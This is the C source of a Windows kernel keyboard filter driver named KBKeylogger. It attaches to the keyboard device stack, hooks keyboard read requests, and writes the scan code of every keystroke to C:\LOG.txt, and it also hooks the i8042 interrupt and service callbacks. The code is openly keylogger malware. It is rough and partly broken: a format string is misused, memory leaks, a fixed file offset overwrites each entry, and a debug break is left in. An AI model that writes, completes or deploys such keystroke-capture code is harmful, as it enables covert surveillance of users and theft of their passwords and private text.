

#include "KBKeylogger.h"

NTSTATUS DriverEntry (PDRIVER_OBJECT, PUNICODE_STRING);

#ifdef ALLOC_PRAGMA
#pragma alloc_text (INIT, DriverEntry)
#pragma alloc_text (PAGE, AddDevice)
#pragma alloc_text (PAGE, KBKeyloggerRead)
#pragma alloc_text (PAGE, KBKeyloggerCreateClose)
#pragma alloc_text (PAGE, IoCtl)
#pragma alloc_text (PAGE, KBKeyloggerInternIoCtl)
#pragma alloc_text (PAGE, Unload)
#pragma alloc_text (PAGE, KBKeyloggerDispatchPassThrough)
#pragma alloc_text (PAGE, KBKeyloggerPnP)
#pragma alloc_text (PAGE, KBKeyloggerPower)
#endif

NTSTATUS
DriverEntry (
    IN  PDRIVER_OBJECT  DriverObject,
    IN  PUNICODE_STRING RegistryPath
    )

{
	__debugbreak();
	DbgPrint("DriverEntry");
    ULONG i;
    UNREFERENCED_PARAMETER (RegistryPath);

    for (i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++) {
        DriverObject->MajorFunction[i] = KBKeyloggerDispatchPassThrough;
    }

	DriverObject->MajorFunction[IRP_MJ_READ] = KBKeyloggerRead;
    DriverObject->MajorFunction [IRP_MJ_CREATE] =
    DriverObject->MajorFunction [IRP_MJ_CLOSE] =        KBKeyloggerCreateClose;
    DriverObject->MajorFunction [IRP_MJ_PNP] =          KBKeyloggerPnP;
    DriverObject->MajorFunction [IRP_MJ_POWER] =        KBKeyloggerPower;
    DriverObject->MajorFunction [IRP_MJ_INTERNAL_DEVICE_CONTROL] =
                                                        KBKeyloggerInternIoCtl;

    DriverObject->DriverUnload = Unload;
    DriverObject->DriverExtension->AddDevice = AddDevice;

    return STATUS_SUCCESS;
}

NTSTATUS
AddDevice(
    IN PDRIVER_OBJECT   Driver,
    IN PDEVICE_OBJECT   PDO
    )
{
	DbgPrint("AddDevice");
    PDEVICE_EXTENSION        devExt;
    IO_ERROR_LOG_PACKET      errorLogEntry;
    PDEVICE_OBJECT           device;
    NTSTATUS                 status = STATUS_SUCCESS;

    PAGED_CODE();

    status = IoCreateDevice(Driver,         
                            sizeof(DEVICE_EXTENSION), 
                            NULL,                    
                            FILE_DEVICE_KEYBOARD,   
                            0,                     
                            FALSE,                
                            &device              
                            );

    if (!NT_SUCCESS(status)) {
        return (status);
    }

    RtlZeroMemory(device->DeviceExtension, sizeof(DEVICE_EXTENSION));

    devExt = (PDEVICE_EXTENSION) device->DeviceExtension;
    devExt->TopOfStack = IoAttachDeviceToDeviceStack(device, PDO);

    if (devExt->TopOfStack == NULL) {
        IoDeleteDevice(device);
        return STATUS_DEVICE_NOT_CONNECTED; 
    }

    
    ASSERT(devExt->TopOfStack);

    devExt->Self =          device;
    devExt->PDO =           PDO;
    devExt->DeviceState =   PowerDeviceD0;

    devExt->SurpriseRemoved = FALSE;
    devExt->Removed =         FALSE;
    devExt->Started =         FALSE;

    device->Flags |= (DO_BUFFERED_IO | DO_POWER_PAGABLE);
    device->Flags &= ~DO_DEVICE_INITIALIZING;


	NTSTATUS fi;
	RtlInitUnicodeString(&TestName, L"\\??\\C:\\LOG.txt");
	InitializeObjectAttributes(&ObjAttr, &TestName,
		OBJ_CASE_INSENSITIVE,
		0, NULL);
	FileStatus = ZwCreateFile(&TestFile,
		FILE_WRITE_DATA,
		&ObjAttr,
		&IoStatus, NULL,
		FILE_ATTRIBUTE_NORMAL,
		FILE_SHARE_WRITE,
		FILE_OPEN_IF,
		FILE_SYNCHRONOUS_IO_NONALERT,
		NULL, 0);
	if (FileStatus != STATUS_SUCCESS)
	{
		fi = FileStatus;
		DbgPrint("omg");
	}
    return status;
}




NTSTATUS ReadCompletion(
	IN PDEVICE_OBJECT DeviceObject,
	IN PIRP Irp,
	IN PVOID Context
	)
{
	PKEYBOARD_INPUT_DATA KeyData;
	ULONG KeyCount;
	ULONG i;
	UNICODE_STRING buf;
	LARGE_INTEGER liOffset = { 0 };
	PVOID lpBuffer;
	NTSTATUS er;
	if (Irp->IoStatus.Status == STATUS_SUCCESS)
	{
		KeyData = (PKEYBOARD_INPUT_DATA)Irp->AssociatedIrp.SystemBuffer;
		KeyCount = Irp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA);

		for (i = 0; i < KeyCount; i++)
		{
			RtlInitUnicodeString(&buf, L"%d", KeyData[i].MakeCode);
			/*ZwQueryInformationFile(TestFile, &IoStatus, &FileInfo,
				sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation);*/
			lpBuffer = ExAllocatePool(NonPagedPool, sizeof(KeyData[i].MakeCode));
			lpBuffer = &buf;
			er = ZwWriteFile(TestFile,
				NULL, NULL, NULL,
				&IoStatus,
				lpBuffer,
				sizeof(KeyData[i].MakeCode),
				&liOffset, NULL);
		}
	}

	if (Irp->PendingReturned)
		IoMarkIrpPending(Irp);

	ObDereferenceObject(DeviceObject);
	InterlockedDecrement((PLONG)&gSysEnters);

	return STATUS_SUCCESS;
}

NTSTATUS
KBKeyloggerRead(
    IN PDEVICE_OBJECT   DeviceObject,
    IN PIRP             Irp
    )
{
		ObReferenceObject(DeviceObject);
		InterlockedIncrement((PLONG)&gSysEnters);

		IoCopyCurrentIrpStackLocationToNext(Irp);
		IoSetCompletionRoutine(Irp, ReadCompletion, NULL, TRUE, TRUE, TRUE);	
	
	return IoCallDriver(((PDEVICE_EXTENSION)DeviceObject->DeviceExtension)->TopOfStack, Irp);

}



NTSTATUS
Complete(
    IN PDEVICE_OBJECT   DeviceObject,
    IN PIRP             Irp,
    IN PVOID            Context
    )
{
	DbgPrint("Complete");
    PKEVENT  event;
	event = (PKEVENT) Context;
    UNREFERENCED_PARAMETER(DeviceObject);
    UNREFERENCED_PARAMETER(Irp);
	KeSetEvent(event, 0, FALSE);
    return STATUS_MORE_PROCESSING_REQUIRED;
}

NTSTATUS
KBKeyloggerCreateClose (
    IN  PDEVICE_OBJECT  DeviceObject,
    IN  PIRP            Irp
    )
{
    PIO_STACK_LOCATION  irpStack;
    NTSTATUS            status;
    PDEVICE_EXTENSION   devExt;
	DbgPrint("CreateClose");

    PAGED_CODE();

    irpStack = IoGetCurrentIrpStackLocation(Irp);
    devExt = (PDEVICE_EXTENSION) DeviceObject->DeviceExtension;

    status = Irp->IoStatus.Status;

    switch (irpStack->MajorFunction) {
    case IRP_MJ_CREATE:
    
        if (NULL == devExt->UpperConnectData.ClassService) {
            //
            // No Connection yet.  How can we be enabled?
            //
            status = STATUS_INVALID_DEVICE_STATE;
        }
        else if ( 1 == InterlockedIncrement64(&devExt->EnableCount)) {
            //
            // first time enable here
            //
        }
        else {
            //
            // More than one create was sent down
            //
        }
    
        break;

    case IRP_MJ_CLOSE:

        if (0 == InterlockedDecrement(&devExt->EnableCount)) {
            //
            // successfully closed the device, do any appropriate work here
            //
        }

        break;
    }

    Irp->IoStatus.Status = status;

    //
    // Pass on the create and the close
    //
    return KBKeyloggerDispatchPassThrough(DeviceObject, Irp);
}

NTSTATUS
KBKeyloggerDispatchPassThrough(
        IN PDEVICE_OBJECT DeviceObject,
        IN PIRP Irp
        )
{	
	DbgPrint("Disptch");
	PIO_STACK_LOCATION irpStack = IoGetCurrentIrpStackLocation(Irp);
	IoSkipCurrentIrpStackLocation(Irp);
	return IoCallDriver(((PDEVICE_EXTENSION)DeviceObject->DeviceExtension)->TopOfStack, Irp);
}           

NTSTATUS
KBKeyloggerInternIoCtl(
    IN PDEVICE_OBJECT DeviceObject,
    IN PIRP Irp
    )
{
	DbgPrint("InternIoCtl");
    PIO_STACK_LOCATION              irpStack;
    PDEVICE_EXTENSION               devExt;
    PINTERNAL_I8042_HOOK_KEYBOARD   hookKeyboard; 
    KEVENT                          event;
    PCONNECT_DATA                   connectData;
    NTSTATUS                        status = STATUS_SUCCESS;

    devExt = (PDEVICE_EXTENSION) DeviceObject->DeviceExtension;
    Irp->IoStatus.Information = 0;
    irpStack = IoGetCurrentIrpStackLocation(Irp);

    switch (irpStack->Parameters.DeviceIoControl.IoControlCode) {

    //
    // Connect a keyboard class device driver to the port driver.
    //
    case IOCTL_INTERNAL_KEYBOARD_CONNECT:
        //
        // Only allow one connection.
        //
        if (devExt->UpperConnectData.ClassService != NULL) {
            status = STATUS_SHARING_VIOLATION;
            break;
        }
        else if (irpStack->Parameters.DeviceIoControl.InputBufferLength <
                sizeof(CONNECT_DATA)) {
            //
            // invalid buffer
            //
            status = STATUS_INVALID_PARAMETER;
            break;
        }

        //
        // Copy the connection parameters to the device extension.
        //
        connectData = ((PCONNECT_DATA)
            (irpStack->Parameters.DeviceIoControl.Type3InputBuffer));

        devExt->UpperConnectData = *connectData;

        //
        // Hook into the report chain.  Everytime a keyboard packet is reported
        // to the system, KbFilter_ServiceCallback will be called
        //
        connectData->ClassDeviceObject = devExt->Self;
        connectData->ClassService = ServiceCallback;
        break;

    //
    // Disconnect a keyboard class device driver from the port driver.
    //
    case IOCTL_INTERNAL_KEYBOARD_DISCONNECT:

        //
        // Clear the connection parameters in the device extension.
        //
        // devExt->UpperConnectData.ClassDeviceObject = NULL;
        // devExt->UpperConnectData.ClassService = NULL;

        status = STATUS_NOT_IMPLEMENTED;
        break;

    //
    // Attach this driver to the initialization and byte processing of the 
    // i8042 (ie PS/2) keyboard.  This is only necessary if you want to do PS/2
    // specific functions, otherwise hooking the CONNECT_DATA is sufficient
    //
    case IOCTL_INTERNAL_I8042_HOOK_KEYBOARD:
        DebugPrint(("hook keyboard received!\n")); 
        if (irpStack->Parameters.DeviceIoControl.InputBufferLength <
            sizeof(INTERNAL_I8042_HOOK_KEYBOARD)) {
            DebugPrint(("InternalIoctl error - invalid buffer length\n"));

            status = STATUS_INVALID_PARAMETER;
            break;
        }
        hookKeyboard = (PINTERNAL_I8042_HOOK_KEYBOARD) 
            irpStack->Parameters.DeviceIoControl.Type3InputBuffer;
            
        //
        // Enter our own initialization routine and record any Init routine
        // that may be above us.  Repeat for the isr hook
        // 
        devExt->UpperContext = hookKeyboard->Context;

        //
        // replace old Context with our own
        //
        hookKeyboard->Context = (PVOID) DeviceObject;

        if (hookKeyboard->InitializationRoutine) {
            devExt->UpperInitializationRoutine =
                hookKeyboard->InitializationRoutine;
        }
        hookKeyboard->InitializationRoutine =
            (PI8042_KEYBOARD_INITIALIZATION_ROUTINE) 
            InitializationRoutine;

        if (hookKeyboard->IsrRoutine) {
            devExt->UpperIsrHook = hookKeyboard->IsrRoutine;
        }
        hookKeyboard->IsrRoutine = (PI8042_KEYBOARD_ISR) IsrHook; 

        //
        // Store all of the other important stuff
        //
        devExt->IsrWritePort = hookKeyboard->IsrWritePort;
        devExt->QueueKeyboardPacket = hookKeyboard->QueueKeyboardPacket;
        devExt->CallContext = hookKeyboard->CallContext;

        status = STATUS_SUCCESS;
        break;

  
#if 0      
    case IOCTL_INTERNAL_KEYBOARD_ENABLE:
    case IOCTL_INTERNAL_KEYBOARD_DISABLE:
        status = STATUS_NOT_SUPPORTED;
        break;
#endif 

  
    case IOCTL_KEYBOARD_QUERY_ATTRIBUTES:
    case IOCTL_KEYBOARD_QUERY_INDICATOR_TRANSLATION:
    case IOCTL_KEYBOARD_QUERY_INDICATORS:
    case IOCTL_KEYBOARD_SET_INDICATORS:
    case IOCTL_KEYBOARD_QUERY_TYPEMATIC:
    case IOCTL_KEYBOARD_SET_TYPEMATIC:
        break;
    }

    if (!NT_SUCCESS(status)) {
        Irp->IoStatus.Status = status;
        IoCompleteRequest(Irp, IO_NO_INCREMENT);
        return status;
    }

    return KBKeyloggerDispatchPassThrough(DeviceObject, Irp);
}

NTSTATUS
KBKeyloggerPnP(
    IN PDEVICE_OBJECT DeviceObject,
    IN PIRP Irp
    )

{
	DbgPrint("PnP");
    PDEVICE_EXTENSION           devExt; 
    PIO_STACK_LOCATION          irpStack;
    NTSTATUS                    status = STATUS_SUCCESS;
    KIRQL                       oldIrql;
    KEVENT                      event;        

    PAGED_CODE();

    devExt = (PDEVICE_EXTENSION) DeviceObject->DeviceExtension;
    irpStack = IoGetCurrentIrpStackLocation(Irp);

    switch (irpStack->MinorFunction) {
    case IRP_MN_START_DEVICE: {
        IoCopyCurrentIrpStackLocationToNext(Irp);
        KeInitializeEvent(&event,
                          NotificationEvent,
                          FALSE
                          );

        IoSetCompletionRoutine(Irp,
                               (PIO_COMPLETION_ROUTINE) Complete, 
                               &event,
                               TRUE,
                               TRUE,
                               TRUE); // No need for Cancel

        status = IoCallDriver(devExt->TopOfStack, Irp);

        if (STATUS_PENDING == status) {
            KeWaitForSingleObject(
               &event,
               Executive, // Waiting for reason of a driver
               KernelMode, // Waiting in kernel mode
               FALSE, // No allert
               NULL); // No timeout
        }

        if (NT_SUCCESS(status) && NT_SUCCESS(Irp->IoStatus.Status)) {
            devExt->Started = TRUE;
            devExt->Removed = FALSE;
            devExt->SurpriseRemoved = FALSE;
        }

        Irp->IoStatus.Status = status;
        Irp->IoStatus.Information = 0;
        IoCompleteRequest(Irp, IO_NO_INCREMENT);

        break;
    }

    case IRP_MN_SURPRISE_REMOVAL:
       
        devExt->SurpriseRemoved = TRUE;

        IoSkipCurrentIrpStackLocation(Irp);
        status = IoCallDriver(devExt->TopOfStack, Irp);
        break;

    case IRP_MN_REMOVE_DEVICE:
        
        devExt->Removed = TRUE;
        Irp->IoStatus.Status = STATUS_SUCCESS;
        
        IoSkipCurrentIrpStackLocation(Irp);
        status = IoCallDriver(devExt->TopOfStack, Irp);
		
		ZwClose(TestFile);
        IoDetachDevice(devExt->TopOfStack); 
        IoDeleteDevice(DeviceObject);

        break;

    case IRP_MN_QUERY_REMOVE_DEVICE:
    case IRP_MN_QUERY_STOP_DEVICE:
    case IRP_MN_CANCEL_REMOVE_DEVICE:
    case IRP_MN_CANCEL_STOP_DEVICE:
    case IRP_MN_FILTER_RESOURCE_REQUIREMENTS: 
    case IRP_MN_STOP_DEVICE:
    case IRP_MN_QUERY_DEVICE_RELATIONS:
    case IRP_MN_QUERY_INTERFACE:
    case IRP_MN_QUERY_CAPABILITIES:
    case IRP_MN_QUERY_DEVICE_TEXT:
    case IRP_MN_QUERY_RESOURCES:
    case IRP_MN_QUERY_RESOURCE_REQUIREMENTS:
    case IRP_MN_READ_CONFIG:
    case IRP_MN_WRITE_CONFIG:
    case IRP_MN_EJECT:
    case IRP_MN_SET_LOCK:
    case IRP_MN_QUERY_ID:
    case IRP_MN_QUERY_PNP_DEVICE_STATE:
    default:
        IoSkipCurrentIrpStackLocation(Irp);
        status = IoCallDriver(devExt->TopOfStack, Irp);
        break;
    }

    return status;
}

NTSTATUS
KBKeyloggerPower(
    IN PDEVICE_OBJECT    DeviceObject,
    IN PIRP              Irp
    )
{
    PIO_STACK_LOCATION  irpStack;
    PDEVICE_EXTENSION   devExt;
    POWER_STATE         powerState;
    POWER_STATE_TYPE    powerType;
	DbgPrint("Power");
    PAGED_CODE();

    devExt = (PDEVICE_EXTENSION) DeviceObject->DeviceExtension;
    irpStack = IoGetCurrentIrpStackLocation(Irp);

    powerType = irpStack->Parameters.Power.Type;
    powerState = irpStack->Parameters.Power.State;

    switch (irpStack->MinorFunction) {
    case IRP_MN_SET_POWER:
        if (powerType  == DevicePowerState) {
            devExt->DeviceState = powerState.DeviceState;
        }

    case IRP_MN_POWER_SEQUENCE:
    case IRP_MN_WAIT_WAKE:
    case IRP_MN_QUERY_POWER:
    default:
        break;
    }

    PoStartNextPowerIrp(Irp);
    IoSkipCurrentIrpStackLocation(Irp);
    return PoCallDriver(devExt->TopOfStack, Irp);
}

NTSTATUS
InitializationRoutine(
    IN PDEVICE_OBJECT                  DeviceObject,    
    IN PVOID                           SynchFuncContext,
    IN PI8042_SYNCH_READ_PORT          ReadPort,
    IN PI8042_SYNCH_WRITE_PORT         WritePort,
    OUT PBOOLEAN                       TurnTranslationOn
    )
{
    PDEVICE_EXTENSION  devExt;
    NTSTATUS            status = STATUS_SUCCESS;

    devExt = DeviceObject->DeviceExtension;
	DbgPrint("InitializationRoutine");
    if (devExt->UpperInitializationRoutine) {
        status = (*devExt->UpperInitializationRoutine) (
            devExt->UpperContext,
            SynchFuncContext,
            ReadPort,
            WritePort,
            TurnTranslationOn
            );

        if (!NT_SUCCESS(status)) {
            return status;
        }
    }

    *TurnTranslationOn = TRUE;
    return status;
}

BOOLEAN
IsrHook(
    PDEVICE_OBJECT         DeviceObject,               
    PKEYBOARD_INPUT_DATA   CurrentInput, 
    POUTPUT_PACKET         CurrentOutput,
    UCHAR                  StatusByte,
    PUCHAR                 DataByte,
    PBOOLEAN               ContinueProcessing,
    PKEYBOARD_SCAN_STATE   ScanState
    )
{
    PDEVICE_EXTENSION devExt;
    BOOLEAN           retVal = TRUE;

	DbgPrint("IsrHook");

    devExt = DeviceObject->DeviceExtension;

    if (devExt->UpperIsrHook) {
        retVal = (*devExt->UpperIsrHook) (
            devExt->UpperContext,
            CurrentInput,
            CurrentOutput,
            StatusByte,
            DataByte,
            ContinueProcessing,
            ScanState
            );

        if (!retVal || !(*ContinueProcessing)) {
            return retVal;
        }
    }

    *ContinueProcessing = TRUE;
    return retVal;
}

VOID
ServiceCallback(
    IN PDEVICE_OBJECT DeviceObject,
    IN PKEYBOARD_INPUT_DATA InputDataStart,
    IN PKEYBOARD_INPUT_DATA InputDataEnd,
    IN OUT PULONG InputDataConsumed
    )
{
	DbgPrint("ServiceCallback");
    PDEVICE_EXTENSION   devExt;

    devExt = (PDEVICE_EXTENSION) DeviceObject->DeviceExtension;

    (*(PSERVICE_CALLBACK_ROUTINE) devExt->UpperConnectData.ClassService)(
        devExt->UpperConnectData.ClassDeviceObject,
        InputDataStart,
        InputDataEnd,
        InputDataConsumed);
}

VOID
Unload(
   IN PDRIVER_OBJECT Driver
   )
{
    PAGED_CODE();
	DbgPrint("DriverUnload");

    UNREFERENCED_PARAMETER(Driver);

    ASSERT(NULL == Driver->DeviceObject);
}


